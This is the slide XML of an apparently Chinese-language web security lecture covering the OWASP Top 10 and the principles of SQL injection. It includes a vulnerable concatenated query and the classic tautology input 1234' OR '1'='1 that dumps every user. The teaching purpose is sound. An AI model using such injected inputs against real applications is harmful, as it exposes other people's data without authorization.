            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>A5. Security </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1"/>
              <a:t>Misconfiguration</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>：安全配置错误；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OWASP 2013</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27195" y="1101725"/>
            <a:ext cx="8131896" cy="5065712"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4500"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>A6.Sensitive Data Exposure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>：敏感数据暴露；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4500"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>A7.Missing Function Level Access Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>：功能级别访问控制缺失；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4500"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>A8. Cross-Site Request Forgery (CSRF)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>：跨站请求伪造；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4500"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>A9.Using Know Vulnerable Components</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>：使用已知易受攻击的组件；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4500"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>A10.Unvalidated Redirects and Forwards </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>未验证的重定向和转发</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4500"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>OWASP 2013</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OWASP 2017</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1" y="1431348"/>
            <a:ext cx="9144000" cy="504825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OWASP 2017</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1352983"/>
            <a:ext cx="9144000" cy="503872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OWASP 2017</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="658813" y="1731385"/>
            <a:ext cx="7781925" cy="41433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一、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>注入攻击及防范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p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>注入漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="416772"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a:t>     </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Injection flaws</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200"/>
              <a:t>, particularly SQL injection, are common in web applications. Injection occurs when user-supplied data is sent to an interpreter as part of a command or query. The attacker’s hostile data </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tricks the interpreter into executing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200"/>
              <a:t> unintended commands or changing data.</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3200"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="416773" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="468313" y="123507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6772">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4167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r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>注入漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="442371" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1352550"/>
            <a:ext cx="8229600" cy="2646363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>最普遍的注入漏洞包括：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>注入：通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>语句恶意地调用后台数据库</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>系统调用</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>命令调用外部程序</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="442372" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="900113" y="4067175"/>
            <a:ext cx="6624637" cy="946150"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="46800" rIns="90000" bIns="46800" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>任何依赖于解释执行的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>应用都有被注入漏洞攻击的危险！</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="CC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2371">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="442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2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2371">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4423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23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42371">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4423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2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2371">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4423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23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2372"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="442372"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="32" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4423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US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>注入原理</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="436227" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="250825" y="1143000"/>
            <a:ext cx="8686800" cy="5257800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>例子：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>通过用户提供的参数来查询表中的数据</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>"SELECT * FROM USERS WHERE SSN=‘" + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>ssn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> + "’“</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>SSN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>参数来自于用户的输入：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>参数未经验证或编码</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>黑客输入： </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>1234</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> OR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF3300"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>应用程序构造查询语句：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>SELECT * FROM USERS WHERE SSN=‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>1234’ OR ‘1’=‘1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>结果返回数据库中的每一个用户</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="436228" name="AutoShape 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5191125" y="3840163"/>
            <a:ext cx="1582738" cy="719137"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -244483"/>
              <a:gd name="adj2" fmla="val 159713"/>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2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>永真逻辑！</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1">
              <a:solidFill>
                <a:srgbClr val="FF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6227">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="436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6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6227">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="436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6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36227">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
